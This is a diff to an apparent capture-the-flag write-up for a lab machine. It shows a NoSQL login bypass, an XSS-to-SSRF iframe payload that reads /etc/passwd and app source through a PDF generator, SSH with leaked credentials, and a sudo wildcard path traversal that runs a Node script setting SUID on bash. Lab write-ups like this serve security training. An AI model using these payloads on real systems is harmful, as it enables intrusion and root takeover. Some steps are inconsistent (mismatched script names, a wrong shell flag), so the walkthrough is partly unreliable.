@@ -76,3 +76,63 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injectio
 
 
 {"username": {"$ne": null}, "password": {"$ne": null}}
+
+http://dev.stocker.htb/stock
+
+if we look at the source code of the website, we got an API /api/order to make an order that sends basket as a parameter
+and if the order is successful they can see the order details on /api/po/{ordeid}
+
+at /api/po/{ordeid} is a dynamic pdf maker
+
+https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf
+https://namratha-gm.medium.com/chaining-bugs-escalating-xss-to-ssrf-5cd3d986a97c
+
+change the title in the /api/order
+
+get the order id and see the order details on /api/po/{orderid}
+
+XSS to ssrf
+
+<iframe src=file:///etc/passwd></iframe>
+
+we are able to get the ssrf response
+from the /etc/passwd file we got the username as angoose
+
+iframe src=file:///var/www/dev/index.js></iframe>
+As we have a subdomain and it's a login page we can see the code of that page.
+
+we got a password so we try to ssh to the machine with the username we found.
+and it worked.
+
+For privilege escalation, If we see what we can run as sudo user using sudo -l
+
+we got a wildcard in the path so we can inject another path in place of that wildcard
+but we need to make a node js script to execute a command
+
+
+https://stackabuse.com/executing-shell-commands-with-node-js/
+
+const { exec } = require("child_process");
+
+exec("chmod u+s /bin/bash", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
+
+we create a something.js at /tmp directory
+
+touch something.js
+nano something.js
+
+sudo /usr/bin/node /usr/local/scripts/../../../../../tmp/test.js
+
+/bin/bash -e
+
+and we get root.
